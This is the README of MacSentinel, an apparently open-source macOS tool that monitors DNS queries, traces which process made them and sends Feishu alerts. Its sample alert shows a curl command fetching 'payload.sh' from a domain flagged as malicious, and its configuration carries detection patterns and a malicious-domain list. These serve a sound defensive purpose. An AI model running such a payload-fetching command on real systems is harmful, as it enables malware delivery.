# MacSentinel

![version](https://img.shields.io/github/v/tag/summerxzp/MacSentinel?label=version)
![license](https://img.shields.io/badge/license-GPL--3.0-green)

macOS 恶意域名监控溯源工具，基于 [DNSMonitor](https://objective-see.org/products/dnsmonitor.html) 实时捕获 DNS 查询，自动溯源发起进程，推送告警通知。

## 功能

- **DNS 实时监控** — 基于 DNSMonitor NetworkExtension 被动监听，支持子串/后缀/精确三种域名匹配模式
- **深度溯源** — 进程树、父进程链、环境变量（脱敏）、动态库、网络连接、打开文件、代码签名、SHA256
- **进程退出溯源** — 系统日志、持久化检测（LaunchAgents/Daemons）、临时文件分析、崩溃报告
- **威胁情报** — 代码签名分析、高风险路径标注、内置恶意域名黑名单
- **飞书告警** — Webhook 推送 + 频率限制 + 去重，超限时日志不丢失
- **自动恢复** — DNSMonitor 异常退出后自动重启（指数退避：3s → 6s → 12s → ... → 300s）
- **溯源超时保护** — 单次溯源限时 15s，超时自动跳过，不阻塞后续事件
- **配置向导** — 交互式 `setup` 命令引导配置，支持外部 JSON 配置文件
- **运行状态** — `status` 命令查看监控状态和今日命中数

## 快速开始

### 前置条件

- macOS 14.0+（推荐 macOS 15+）
- Python 3.8+
- [DNSMonitor](https://objective-see.org/products/dnsmonitor.html) 已安装

### 安装

```bash
# 1. 克隆仓库
git clone https://github.com/summerxzp/MacSentinel.git
cd MacSentinel

# 2. 安装 DNSMonitor（如未安装）
# 从 https://objective-see.org/products/dnsmonitor.html 下载
sudo cp -r DNSMonitor.app /Applications/

# 3. 配置向导
sudo python3 macsentinel.py setup

# 4. 启动监控
sudo python3 macsentinel.py
```

### 命令

```bash
sudo python3 macsentinel.py            # 启动监控
sudo python3 macsentinel.py status     # 查看运行状态
sudo python3 macsentinel.py setup      # 配置向导
```

## 配置

### 方式一：配置向导（推荐）

```bash
sudo python3 macsentinel.py setup
```

交互式引导配置监控域名、飞书通知、高级参数等。已有配置时先展示当前配置，再选择是否修改。

### 方式二：环境变量

| 变量 | 说明 | 示例 |
|---|---|---|
| `FEISHU_WEBHOOK` | 飞书机器人 Webhook URL | `https://open.feishu.cn/open-apis/bot/v2/hook/xxx` |
| `MONITOR_CONFIG` | 自定义配置文件路径（默认同目录 `config.json`） | `/etc/macsentinel/config.json` |

```bash
export FEISHU_WEBHOOK="https://open.feishu.cn/open-apis/bot/v2/hook/YOUR_HOOK"
sudo -E python3 macsentinel.py
```

### 方式三：JSON 配置文件

复制模板并编辑：

```bash
cp config.example.json config.json
```

### 配置项说明

| 配置项 | 类型 | 默认值 | 说明 |
|---|---|---|---|
| `target_domains` | `string[]` | `["cdn.pynice.com"]` | 监控目标域名列表，支持三种匹配模式（见下文） |
| `feishu_webhook` | `string` | `""` | 飞书 Webhook URL，为空则禁用推送 |
| `feishu_max_per_minute` | `int` | `30` | 飞书推送频率上限（条/分钟） |
| `dnsmon_bin` | `string` | `/Applications/DNSMonitor.app/...` | DNSMonitor 二进制路径 |
| `cleanup_netext` | `bool` | `true` | 退出时是否清理 DNSMonitor 网络扩展 |
| `max_log_size` | `int` | `1073741824` | 单个日志文件最大大小（字节，默认 1GB） |
| `alert_dedup_seconds` | `int` | `30` | 同一 PID + 域名的告警去重窗口（秒） |
| `trace_timeout_seconds` | `int` | `15` | 单次溯源超时时间（秒） |
| `cache_max_size` | `int` | `1000` | 进程缓存最大条目数（LRU 淘汰） |
| `dedup_ttl_seconds` | `int` | `300` | 告警去重条目存活时间（秒），过期自动清理 |
| `malicious_domains` | `string[]` | 见配置文件 | 已知恶意域名黑名单（用于威胁情报标注） |
| `high_risk_paths` | `string[]` | 见配置文件 | 高风险路径列表（用于威胁情报标注） |

### 域名匹配模式

| 前缀 | 模式 | 示例 | 匹配 | 不匹配 |
|---|---|---|---|---|
| 无 | 子串匹配 | `evil.com` | `evil.com` / `abc.evil.com` / `notevil.com` | — |
| `.` | 后缀匹配 | `.evil.com` | `evil.com` / `abc.evil.com` | `notevil.com` |
| `=` | 精确匹配 | `=evil.com` | `evil.com` | `abc.evil.com` |

## 告警示例

命中目标域名后，飞书收到如下卡片消息：

```
🚨 MacSentinel 告警: cdn.pynice.com

🟢 进程存活 (PID: 12345)
- User: root
- Cmd: `/usr/bin/curl https://cdn.pynice.com/payload.sh`
- Start: 2026-05-23 14:30:00
- PPID: 1

🌲 进程树
  launchd (1)
  └─ bash (12340)
     └─ curl (12345)

🔑 环境变量 (可疑项，已脱敏)
  PATH=/usr/local/bin:/usr/bin****
  HOME=/Users/evil****

📚 加载的动态库 (非系统)
  /usr/local/lib/libcurl.4.dylib

🔗 网络连接 (已建立)
  curl  12345  root  IPv4  TCP  10.0.1.5:54321->93.184.216.34:443 (ESTABLISHED)

🔐 代码签名
  签名: adhoc (⚠️ 无正式签名)
  权限: 无

#️⃣ SHA256: `a1b2c3d4e5f6...`
📅 二进制修改时间: 2026-05-20 08:15:00
📦 文件大小: 152.3 KB

🧠 威胁情报
  ⚠️ 已知恶意域名: cdn.pynice.com
  ⚠️ 高风险路径: /tmp/
  ⚠️ 签名异常: adhoc
```

## 日志

| 文件 | 内容 |
|---|---|
| `monitor_YYYYMMDD.log` | 简要日志：启动/停止、DNS 查询、命中摘要、心跳 |
| `monitor_alert_YYYYMMDD.log` | 告警溯源日志：命中时的完整溯源报告 |

- 按日分文件，跨日自动切换
- 单文件 1GB 上限，超限滚动

## 开机自启（launchd）

创建 `/Library/LaunchDaemons/com.macsentinel.plist`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.macsentinel</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>/Library/Security/macsentinel/macsentinel.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/Library/Security/macsentinel/stdout.log</string>
    <key>StandardErrorPath</key>
    <string>/Library/Security/macsentinel/stderr.log</string>
    <key>UserName</key>
    <string>root</string>
</dict>
</plist>
```

```bash
sudo mkdir -p /Library/Security/macsentinel
sudo cp macsentinel.py config.json /Library/Security/macsentinel/
sudo cp com.macsentinel.plist /Library/LaunchDaemons/
sudo chown root:wheel /Library/LaunchDaemons/com.macsentinel.plist
sudo launchctl load -w /Library/LaunchDaemons/com.macsentinel.plist
```

## 测试

```bash
sudo python3 test_monitor.py
```

测试 8 种场景（curl/sh/nslookup/ping 等），输出 DNS 捕获率和告警命中率报告。

## 卸载

```bash
sudo pkill -f macsentinel.py
sudo pkill -f DNSMonitor
sudo launchctl unload -w /Library/LaunchDaemons/com.macsentinel.plist
sudo rm /Library/LaunchDaemons/com.macsentinel.plist
sudo rm -rf /Library/Security/macsentinel
sudo rm -rf /Applications/DNSMonitor.app
```

## 架构

```
DNSMonitor (NetworkExtension)
  → 实时捕获 macOS 全局 DNS 查询 (NDJSON)
  → macsentinel.py 逐行解析
  → 域名匹配 (子串/后缀/精确)
  → 命中后深度溯源 (ps/lsof/codesign/shasum)
  → 飞书告警 + 本地双日志
```

## 权限

| 权限 | 原因 |
|---|---|
| root | DNSMonitor 需要 root 安装 NetworkExtension |
| NetworkExtension | DNSMonitor 通过系统扩展捕获 DNS 流量（被动监听，不拦截） |
| 网络访问 | 飞书 Webhook 推送 |

## 安全注意事项

- 飞书 Webhook URL 包含机器人密钥，**不要提交到公开仓库**（`config.json` 已在 `.gitignore` 中）
- 日志文件可能包含敏感信息（进程路径、命令行参数），妥善保管
- 环境变量采集已做脱敏处理（值超过 4 字符只显示前 4 位 + `****`）
- DNSMonitor 仅被动监听 DNS 流量，不修改系统网络配置
- 本工具仅用于取证分析，不具备自动查杀/隔离能力

## Roadmap

| 功能 | 可行性 | 说明 |
|---|---|---|
| IP 外连监控 | ⚠️ 中等 | 需要替代 DNSMonitor 的 NetworkExtension 方案（如基于 NetworkExtension 的 VPN tunnel 捕获，或定期 `lsof -i` 轮询），无法复用当前 DNS 被动监听架构 |
| 进程监控 | ✅ 高 | 可通过 `eslogger`（Endpoint Security Framework）或定期 `ps` 快照 diff 实现，与当前架构解耦，可作为独立模块 |
| UI | ⚠️ 中等 | 可用 macOS 原生 SwiftUI 做菜单栏状态指示 + 告警历史面板，但需要额外打包签名，增加部署复杂度 |

## License

[GPL-3.0](LICENSE)

本项目使用 [DNSMonitor](https://github.com/objective-see/DNSMonitor)（GPL-3.0, Objective-See）。
